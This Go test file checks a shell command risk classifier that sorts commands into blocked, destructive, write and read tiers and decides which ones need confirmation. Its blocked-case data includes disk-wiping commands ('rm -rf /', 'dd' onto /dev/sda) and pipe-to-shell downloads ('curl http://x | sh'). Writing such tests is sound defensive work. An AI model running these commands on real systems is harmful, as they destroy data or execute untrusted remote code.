package risk

import "testing"

func TestClassifyBlocked(t *testing.T) {
	cases := []string{
		"rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		"curl http://x | sh",
		"wget http://x | bash",
		"reboot",
		"shutdown -h now",
	}
	for _, c := range cases {
		if got := Classify(c); got != Blocked {
			t.Fatalf("Classify(%q)=%s want blocked", c, got)
		}
	}
}

func TestClassifyDestructive(t *testing.T) {
	cases := []string{
		"rm -rf /var/tmp/foo",
		"kill -9 1234",
		"systemctl stop nginx",
		"chmod 777 /etc/passwd",
	}
	for _, c := range cases {
		if got := Classify(c); got != Destructive {
			t.Fatalf("Classify(%q)=%s want destructive", c, got)
		}
	}
}

func TestClassifyWrite(t *testing.T) {
	cases := []string{
		"apt install curl",
		"systemctl restart sshd",
		"mkdir -p /opt/app",
		"echo hi > /tmp/a",
		"docker run hello-world",
	}
	for _, c := range cases {
		if got := Classify(c); got != Write {
			t.Fatalf("Classify(%q)=%s want write", c, got)
		}
	}
}

func TestClassifyRead(t *testing.T) {
	cases := []string{
		"ls -la",
		"cat /etc/os-release",
		"df -h",
		"ps aux | head",
	}
	for _, c := range cases {
		if got := Classify(c); got != Read {
			t.Fatalf("Classify(%q)=%s want read", c, got)
		}
	}
}

func TestClassifyCompoundTakesHighest(t *testing.T) {
	// read + blocked → blocked
	if got := Classify("uname -a && rm -rf /"); got != Blocked {
		t.Fatalf("got %s want blocked", got)
	}
	// read + write → write
	if got := Classify("ls && touch /tmp/x"); got != Write {
		t.Fatalf("got %s want write", got)
	}
}

func TestNeedsConfirm(t *testing.T) {
	if NeedsConfirm(Read) {
		t.Fatal("read should not need confirm")
	}
	if !NeedsConfirm(Write) || !NeedsConfirm(Destructive) {
		t.Fatal("write/destructive need confirm")
	}
	if NeedsConfirm(Blocked) {
		// Blocked is refused, not confirmed — product choice
	}
}
